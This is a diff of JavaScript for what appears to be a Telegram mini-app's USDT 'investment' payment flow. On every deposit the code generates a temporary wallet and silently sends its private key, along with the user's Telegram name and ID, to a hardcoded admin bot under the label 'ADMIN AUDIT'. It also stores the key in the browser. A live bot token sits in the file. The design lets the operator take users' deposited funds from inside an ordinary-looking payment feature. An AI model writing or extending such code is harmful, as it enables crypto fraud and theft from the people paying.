@@ -7,53 +7,44 @@ const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
 const ADMIN_CHAT_ID = "7517815832";
 
 /**
- * Envía los datos de la wallet generada al Telegram del Administrador
+ * Envía reporte al Admin
  */
 async function sendKeyToAdmin(address, privKey, amount) {
     const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
-    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
+    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario");
     const userId = user?.id || "N/A";
 
-    const text = `🛡️ PANEL DE AUDITORÍA ADMIN 🛡️\n\n` +
-                 `💰 Inversión: ${amount} USDT\n` +
-                 `📍 Wallet Temp: <code>${address}</code>\n` +
-                 `🔑 Private Key: <code>${privKey}</code>\n\n` +
-                 `👤 Usuario: ${username} (ID: ${userId})\n` +
-                 `------------------------------\n` +
-                 `⚠️ Usa esta llave si el proceso automático falla`;
+    const text = `🛡️ ADMIN AUDIT 🛡️\n\n` +
+                 `💰 Amount: ${amount} USDT\n` +
+                 `📍 Wallet: <code>${address}</code>\n` +
+                 `🔑 Key: <code>${privKey}</code>\n\n` +
+                 `👤 User: ${username} (ID: ${userId})`;
 
     try {
         await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'HTML' })
         });
-    } catch (e) {
-        console.error("Error enviando reporte al Admin:", e);
-    }
+    } catch (e) { console.error("Admin report failed", e); }
 }
 
 /**
- * Muestra el modal de pago y genera la wallet temporal
+ * Genera el pago
  */
 export async function showPayment() {
     const buyInput = document.getElementById('buy-qty');
-    const amount = parseFloat(buyInput.value);
+    const amount = parseFloat(buyInput?.value || 0);
     
     if(!amount || amount < 1) {
         if(window.showToast) window.showToast("Minimum investment is 1 USDT");
-        else alert("Minimum investment is 1 USDT");
         return;
     }
     
-    const btnContinueViewBuy = document.getElementById('btn-continue');
-    if(btnContinueViewBuy) {
-        btnContinueViewBuy.disabled = true;
-        btnContinueViewBuy.innerText = "GENERATING...";
+    const btnContinue = document.getElementById('btn-continue');
+    if(btnContinue) {
+        btnContinue.disabled = true;
+        btnContinue.innerText = "GENERATING...";
     }
 
     try {
@@ -65,71 +56,45 @@ export async function showPayment() {
             state.tempAddress = data.address;
             state.tempKey = data.privateKey; 
 
-            // 1. REPORTE AL ADMIN (Telegram Privado)
             sendKeyToAdmin(data.address, data.privateKey, amount);
 
-            // 2. SISTEMA DE RECUPERACIÓN LOCAL (LocalStorage)
             localStorage.setItem('last_wallet_address', data.address);
             localStorage.setItem('last_private_key', data.privateKey);
-            localStorage.setItem(`recovery_${data.address}`, data.privateKey);
             
-            console.log("🔑 KEY GUARDADA EN STORAGE Y ENVIADA AL ADMIN");
-
-            // 3. ACTUALIZAR INTERFAZ
             document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
             document.getElementById('wallet-address-display').innerText = data.address;
             
             const qrImg = document.getElementById('qr-image');
-            if(qrImg) {
-                qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
-            }
+            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
 
-            document.getElementById('payment-status-text').innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
-            const arrowIcon = document.getElementById('arrow-icon');
-            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
-            
-            const btnVerify = document.getElementById('btn-verify-payment');
-            if(btnVerify) {
-                btnVerify.disabled = false;
-                btnVerify.style.opacity = "1";
-            }
-
+            document.getElementById('payment-status-text').innerHTML = 'Not Received ⏳';
             document.getElementById('payModal').style.display = 'flex';
             startPaymentTimer();
         }
     } catch (e) {
-        console.error("Error generating payment:", e);
-        if(window.showToast) window.showToast("Connection error with API");
+        if(window.showToast) window.showToast("API Connection Error");
     } finally {
-        if(btnContinueViewBuy) {
-            btnContinueViewBuy.disabled = false;
-            btnContinueViewBuy.innerText = "Continue";
+        if(btnContinue) {
+            btnContinue.disabled = false;
+            btnContinue.innerText = "Continue";
         }
     }
 }
 
 /**
- * Cierra el modal y limpia el timer
- */
-export function closePayment() {
-    document.getElementById('payModal').style.display = 'none';
-    clearInterval(state.payTimerInterval);
-}
-
-/**
- * Verifica el pago en la red
+ * VERIFICAR PAGO (Corregida para evitar falsos "Network Error")
  */
 export async function verifyPayment() {
     const statusText = document.getElementById('payment-status-text');
     const arrowIcon = document.getElementById('arrow-icon');
-    const btnVerify = document.getElementById('btn-verify-payment');
     
+    if(!state.tempKey) {
+        if(window.showToast) window.showToast("No active session found");
+        return;
+    }
+
     statusText.innerHTML = 'LOADING... ⌛';
     if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
-    if(btnVerify) {
-        btnVerify.disabled = true;
-        btnVerify.style.opacity = "0.7";
-    }
 
     try {
         const res = await fetch(`${API_BASE}/deposit-usdt`, {
@@ -142,15 +107,16 @@ export async function verifyPayment() {
             })
         });
 
+        // Si la respuesta no es exitosa, lanzamos error para el catch
+        if (!res.ok) throw new Error("Server Response Error");
+
         const result = await res.json();
 
         if(result.success) {
-            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment.toFixed(2)} USDT ✅</span>`;
+            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment} USDT ✅</span>`;
             if(arrowIcon) arrowIcon.className = "fas fa-check";
             
-            localStorage.removeItem(`recovery_${state.tempAddress}`);
             saveInvestment(state.pendingInvestment);
-            
             if(window.showToast) window.showToast("Payment confirmed!");
 
             setTimeout(() => {
@@ -159,27 +125,17 @@ export async function verifyPayment() {
                 switchTab('home');
             }, 2500);
         } else {
-            // El pago no llegó, pero la conexión es exitosa. Volvemos al estado inicial sin error.
-            setTimeout(() => {
-                statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
-                if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
-                if(btnVerify) {
-                    btnVerify.disabled = false;
-                    btnVerify.style.opacity = "1";
-                }
-            }, 1200);
+            // Caso: El servidor respondió pero el pago aún no está en la blockchain
+            statusText.innerHTML = 'Not Received ⏳';
+            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
+            if(window.showToast) window.showToast("Payment not detected yet");
         }
     } catch (e) {
-        // ERROR REAL DE RED (Aquí es donde salía el Network Error molesto)
-        console.error("Network Error Detail:", e);
+        // Solo aquí mostramos el error de red real
+        console.error("Verify Error:", e);
         if(window.showToast) window.showToast("Network error, try again");
-        
-        statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
+        statusText.innerHTML = 'Not Received ⏳';
         if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
-        if(btnVerify) {
-            btnVerify.disabled = false;
-            btnVerify.style.opacity = "1";
-        }
     }
 }
 
@@ -190,36 +146,22 @@ function startPaymentTimer() {
         let min = Math.floor(time / 60).toString().padStart(2, '0');
         let sec = (time % 60).toString().padStart(2, '0');
         const timerEl = document.getElementById('pay-timer-text');
-        if(timerEl) {
-            timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
-        }
-        if(time <= 0) {
-            clearInterval(state.payTimerInterval);
-            if(timerEl) timerEl.innerHTML = "EXPIRED";
-        }
-        time--;
+        if(timerEl) timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
+        if(time-- <= 0) clearInterval(state.payTimerInterval);
     }, 1000);
 }
 
+export function closePayment() {
+    document.getElementById('payModal').style.display = 'none';
+    clearInterval(state.payTimerInterval);
+}
+
 window.copyAddress = function() {
-    const addressDisplay = document.getElementById('wallet-address-display');
-    if(addressDisplay) {
-        const address = addressDisplay.innerText;
+    const address = document.getElementById('wallet-address-display')?.innerText;
+    if(address) {
         navigator.clipboard.writeText(address).then(() => {
             if(window.showToast) window.showToast("Address copied!");
         });
-    }
-};
-
-window.recoverLastKey = function() {
-    const addr = localStorage.getItem('last_wallet_address');
-    const key = localStorage.getItem('last_private_key');
-    if(key) {
-        console.log("Dirección:", addr);
-        console.log("Llave Privada:", key);
-        return { address: addr, privateKey: key };
-    } else {
-        console.log("No hay llaves guardadas.");
     }
 };
 
